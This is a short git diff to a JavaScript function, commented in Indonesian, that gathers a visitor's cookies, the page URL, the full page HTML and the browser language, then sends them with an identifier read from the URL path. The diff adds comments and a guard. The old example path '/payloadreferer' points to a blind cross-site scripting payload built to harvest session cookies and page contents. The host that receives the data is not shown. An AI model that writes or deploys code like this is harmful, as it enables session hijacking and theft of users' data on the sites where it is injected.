@@ -22,7 +22,7 @@ function sendInfo(identifier) {
     }
     const language = navigator.language || navigator.userLanguage;
     const data = {
-        identifier: identifier,
+        identifier: identifier, // Identifier diambil dari URL
         url: window.location.href,
         cookies: document.cookie,
         domStructure: document.documentElement.outerHTML,
@@ -46,6 +46,8 @@ function sendInfo(identifier) {
 }
 
 // Ambil identifier dari URL
-const path = window.location.pathname; // Misalnya: /payloadreferer
+const path = window.location.pathname; // Misalnya: /test
 const identifier = path.split('/')[1]; // Ambil bagian setelah "/"
-sendInfo(identifier);
+if (identifier) {
+    sendInfo(identifier); // Kirim identifier ke server
+}
